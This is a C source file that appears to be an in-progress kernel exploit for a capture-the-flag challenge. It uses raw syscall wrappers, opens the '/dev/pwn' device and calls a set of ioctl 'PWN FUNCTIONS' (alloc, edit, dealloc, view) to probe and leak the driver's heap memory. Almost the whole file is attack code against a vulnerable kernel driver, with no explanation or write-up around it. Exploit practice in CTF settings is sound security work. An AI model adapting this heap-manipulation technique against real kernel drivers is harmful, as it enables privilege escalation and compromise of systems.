#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/uio.h>
#include <syscall.h>

//// SYSCALLS
#define syscall(sysnum) ({ \
  register uint64_t rax asm("rax"); \
  asm volatile("movq %0, %%rax; call __syscall2" :: "i"(sysnum)); \
  rax; \
})

int64_t __syscall2();

void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
  return (void *)syscall(SYS_mmap);
}

int open(const char *pathname, int flags, ...) {
  return (int)syscall(SYS_open);
}

ssize_t write(int fd, const void *buf, size_t count) {
  return (ssize_t)syscall(SYS_write);  
}

ssize_t read(int fd, void *buf, size_t count) {
  return (ssize_t)syscall(SYS_read);  
}

void exit(int status) {
  syscall(SYS_exit);
  __builtin_unreachable();
}

asm(\
"__syscall2: \n" \
"  push %rbp \n" \
"  movq %rcx, %r10 \n" \
"  movq 16(%rsp), %rbp \n" \
"  syscall \n" \
"  pop %rbp \n" \
"  ret\n" \
);

int ioctl(int fd, unsigned long req, ...) {
  return syscall(SYS_ioctl);
}

const char nl = '\n';
void writeln(int fd, const char *buf) {
  while (*buf) {
    write(fd, buf, 1);
    buf++;
  }
  write(fd, &nl, 1);
}

struct ioctl_param {
  uint64_t  vec_ct;
  struct iovec vecs[16];
  int ind;             
};

#define ERR(res, msg) do { \
  if ((res) < 0) { \
    writeln(2, "ERROR: " msg); \
    exit(1); \
  } \
} while(0)

////// PWN FUNCTIONS

int pfd;

void bzero(void *data, uint64_t size) {
  while (size--) {
    ((char*)data)[size] = 0;
  }
}

void alloc(const void *data, uint64_t len) {
  struct ioctl_param pm = {
    .vec_ct = 1,
    .vecs = { 
      [0] = {(void*)data, len}
    }
  };
  
  ioctl(pfd, 6, &pm);
}

void edit(int ind, const void *data, uint64_t len) {
  struct ioctl_param pm = {
    .vec_ct = 1,
    .vecs = { 
      [0] = {(void*)data, len}
    },
    .ind = ind
  };
  
  ioctl(pfd, 666, &pm);
}

void dealloc(int ind) {
  ioctl(pfd, 6666, &ind);
}

void view(int ind, void *data, uint64_t len) {
  struct ioctl_param pm = {
    .vec_ct = 1,
    .vecs = { 
      [0] = {data, len}
    },
    .ind = ind
  };
  
  ioctl(pfd, 66, &pm);
}


void _start() {
  pfd = open("/dev/pwn", O_RDONLY);
  ERR(pfd, "open()");

  char data[16] = {};

  // Allocate two things
  alloc("AAAAAAAABBBBBBBB", 16);
  alloc("aaaaaaaabbbbbbbb", 16);

  edit(0, 0, 6);
  bzero(data, sizeof(data));
  view(0, data, sizeof(data));
  write(1, data, sizeof(data));

//dealloc(1);

  edit(0, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16);
  alloc("aaaaaaaabbbbbbbb", 16);

  bzero(data, sizeof(data));
  view(0, data, sizeof(data));
  write(1, data, sizeof(data));

//  alloc("aaaaaaaabbbbbbbb", 16);
//
//  bzero(data, sizeof(data));
//  view(0, data, sizeof(data));
//  write(1, data, sizeof(data));
//
//  alloc("aaaaaaaabbbbbbbb", 16);
//
//  bzero(data, sizeof(data));
//  view(0, data, sizeof(data));
//  write(1, data, sizeof(data));

  exit(0);
}














